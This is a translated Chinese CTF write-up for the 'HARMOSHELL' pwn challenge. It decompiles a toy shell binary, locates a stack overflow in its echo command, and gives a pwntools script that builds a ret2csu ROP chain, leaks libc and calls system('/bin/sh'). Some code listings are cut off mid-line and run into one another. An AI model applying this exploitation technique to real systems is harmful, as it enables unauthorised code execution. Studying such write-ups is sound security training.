# 华为系列CTF PWN WriteUp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## HARMOSHELL
这里实现了一个简单的`shell`，反汇编使用`ghrida`。
    void main(void)
    {
      ssize_t cmd_length;
      undefined4 extraout_var;
      uint *cmd_type;
      undefined cmd [257];
      init();
      do {
        std::__ostream_insert>((basic_ostream *)std::cout,"$ ",2);
        memset(cmd + 1,0,0x100);
        cmd_length = read(0,cmd + 1,0x100);
        cmd[CONCAT44(extraout_var,cmd_length)] = 0;
        cmd_type = (uint *)parseline(cmd + 1);
        if (*cmd_type >
                      ((basic_ostream *)std::cout,"Invalid command",0xf);
            std::endl>((basic_ostream *)std::cout);
          case 5:
                        /* WARNING: Subroutine does not return */
            exit(0);
          }
        }
        if (*(void **)(cmd_type + 2) != (void *)0x0) {
          operator.delete(*(void **)(cmd_type + 2));
        }
        operator.delete(cmd_type,0x20);
      } while( true );
    }
这里模拟了文件的处理，有`touch,rm,cat,ls,echo`五个命令，其中`file`的结构体如下
这里漏洞分析之后也很明显，在`echo`函数中存在一个栈溢出的漏洞
    file_list = (file_node **)&gp0xfffffffffffffa60;
    while ((file_node = *file_list, file_node == (file_node *)0x0 ||
            (iVar2 = strcmp(file_name,(char *)file_node), CONCAT44(extraout_var_01,iVar2) != 0))) {
      file_list = file_list + 1;
      if (file_list == (file_node **)&gp0xfffffffffffffbe0) {
        __nbytes = 0x200;
        LAB_00011516:
        content_length = read(0,content_buf,__nbytes);
        write2file(*(undefined8 *)(*(longlong *)(param_1 + 8) + 0x10),content_buf,
                   (longlong)content_length,flag);
        return;
      }
    }
    __nbytes = *(size_t *)&file_node->file_length;
    goto LAB_00011516;
这里可以看到当`file`搜索到列表之后的最后一个的时候会出现读取`0x200`字节，但是`content_buf`的大小只有`0x108`大小。因此这里我们可以造成栈溢出。那么之后如何覆写返回地址呢。这里返回地址虽然是保存在`ra`寄存器中。正常状态下没办法直接覆写，我们看一下溢出时候的函数调用
    LAB_00011516                                    XREF[1]:     0001154a(j)  
    00011516 8a 85           c.mv       a1,sp
    00011518 01 45           c.li       a0,0x0
    0001151a ef f0 7f 8a     jal        ra,read                                          ssize_t read(int __fd, void * __
    0001151e 83 37 8a 00     ld         a5,0x8(s4)
    00011522 1b 06 05 00     sext.w     a2,content_length
    00011526 d6 86           c.mv       a3,flag
    00011528 88 6b           c.ld       content_length,0x10(a5)
    0001152a 8a 85           c.mv       a1,sp
    0001152c ef f0 7f eb     jal        ra,write2file                                    undefined write2file(undefined8 
    00011530 f2 70           c.ldsp     ra,0x138(sp) > " + file)
        p.send(content)
    for i in range(0x30-1):
        touch("flag"+str(i))
    raw_input()
    # 0x00010778   # 2: lw a0, 28(sp)
    # 0001182c csu
    '''
            0001181c 56 86           c.mv       a2,s5
            0001181e d2 85           c.mv       a1,s4
            00011820 4e 85           c.mv       a0,s3
            00011822 85 04           c.addi     s1,0x1
            00011824 82 97           c.jalr     a5=>_INIT_0                                      undefined _INIT_1()
                                                                                                 undefined _INIT_0()
            00011826 21 04           c.addi     s0,0x8
            00011828 e3 19 99 fe     bne        s2,s1,LAB_0001181a
                                 LAB_0001182c                                    XREF[1]:     0001180e(j)  
            0001182c e2 70           c.ldsp     ra,0x38(sp)
            0001182e 42 74           c.ldsp     s0,0x30(sp)
            00011830 a2 74           c.ldsp     s1,0x28(sp)
            00011832 02 79           c.ldsp     s2,0x20(sp)
            00011834 e2 69           c.ldsp     s3,0x18(sp)
            00011836 42 6a           c.ldsp     s4,0x10(sp)
            00011838 a2 6a           c.ldsp     s5,0x8(sp)
            0001183a 21 61           c.addi16sp sp,0x40
            0001183c 82 80           ret
    '''
    def csu(addr, a0, a1, a2):
        p = b"/bin/sh\x00"+p64(a2)+p64(a1)+p64(a0)+p64(1)+p64(0)
        p += p64(addr)+p64(csu2)
        return p
    def csu_j(addr):
        p = p64(0)+p64(0)+p64(0)+p64(0)+p64(1)+p64(0)
        p += p64(0)+p64(addr)
        return p
    csu1 = 0x0001182c
    csu2 = 0x0001181a
    bss = 0x00013340
    cout_addr = 0x13118
    read_got = 0x13060
    stdaddr = 0x13080
    read_plt = 0x10dc0
    straddr = 0x118e8
    ret_addr = 0x114b8
    payload = b'a'*(0x138)+p64(csu1)
    #print('read:',hex(e.got['']))
    payload += csu(stdaddr, cout_addr, read_got, 0x10)
    payload += csu(read_got, 0, read_got, 0x10)
    payload += csu(read_got, read_got+8, read_got, 0x10)
    echo("flag47", payload)
    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.sym['read']
    log.success("libc address is {}".format(hex(libc.address)))
    p.send(p64(libc.sym['system'])+b'/bin/sh\x00')
    p.interactive()
## HARMOSHELL2